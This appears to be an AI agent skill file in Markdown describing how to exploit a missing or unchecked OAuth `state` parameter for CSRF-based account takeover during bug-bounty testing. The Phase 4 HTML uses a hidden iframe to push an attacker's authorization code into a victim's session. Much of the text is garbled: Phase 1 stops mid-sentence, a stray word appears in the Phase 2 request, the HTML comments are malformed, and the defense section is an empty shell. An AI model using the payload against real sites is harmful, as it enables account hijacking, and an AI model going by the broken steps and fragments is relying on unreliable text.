---
name: oauth-state-parameter-abuse
description: >
  Identify and exploit logic flaws in OAuth implementations, focusing specifically on the absence 
  or improper validation of the `state` parameter, which leads to Cross-Site Request Forgery (CSRF) 
  and account takeover (ATO).
domain: cybersecurity
subdomain: bug-hunting
category: Logic Flaws
difficulty: intermediate
estimated_time: "2 hours"
mitre_attack:
  tactics: [TA0001, TA0006]
  techniques: [T1190]
platforms: [web]
tags: [oauth, oauth2, logic-flaw, csrf, account-takeover, bug-hunting, web-security]
tools: [burp-suite, web-browser]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# OAuth State Parameter Abuse

## When to Use
- When auditing web applications that use "Log in with [Google/Facebook/GitHub]" (OAuth 2.0 / OpenID Connect) or allow linking third-party accounts.
- To test if the application is susceptible to CSRF attacks during the OAuth authorization flow, enabling attackers to link their own external accounts to a victim's session.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Initiating the OAuth Flow

```text
# Concept: The `state` parameter is ```

### Phase 2: Intercepting the Authorization Request

```http
# # beautifully GET /oauth/authorize?response_type=code&client_id=12345&redirect_uri=https%3A%2F%2Ftarget.com%2Fcallback&scope=email%20profile HTTP/1.1
Host: provider.com
```

### Phase 3: Capturing the Callback (The CSRF Payload)

```http
# https://target.com/callback?code=SPLIT_SECOND_CODE_FROM_ATTACKER
```

### Phase 4: Delivering the Payload (Exploitation)

```html
<!-- >
<html>
  <body>
    <!-- >
    <iframe src="https://target.com/callback?code=ATTACKER_UNPUBLISHED_CODE" style="display:none;"></iframe>
  </body>
</html>
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Start OAuth ] --> B{State Parameter ]}
    B -->|Missing/Static| C[Capture Callback ]
    B -->|Verified| D[Check Logic ]
    C --> E[Exploit CSRF ]
```

## 🔵 Blue Team Detection & Defense
- **Strict State Validation**: **PKCE (Proof Key for Code Exchange)**: Key Concepts
| Concept | Description |
|---------|-------------|
## Output Format
```
Oauth State Parameter Abuse — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- PortSwigger: [OAuth Vulnerabilities](https://portswigger.net/web-security/oauth)
- IETF: [OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)
